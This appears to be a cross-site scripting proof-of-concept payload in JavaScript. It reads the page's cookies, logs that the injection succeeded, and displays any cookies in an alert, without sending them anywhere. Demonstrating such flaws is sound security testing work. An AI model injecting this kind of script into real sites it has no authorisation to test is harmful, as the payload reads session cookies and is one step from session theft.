var x = document.cookie;
console.log("XSS Injection was successful on this page!");
if(x.length > 0){
    alert("Cookies Found!\n" + x);
    console.error("Cookies were found. This is a CRITICAL security flaw!")
}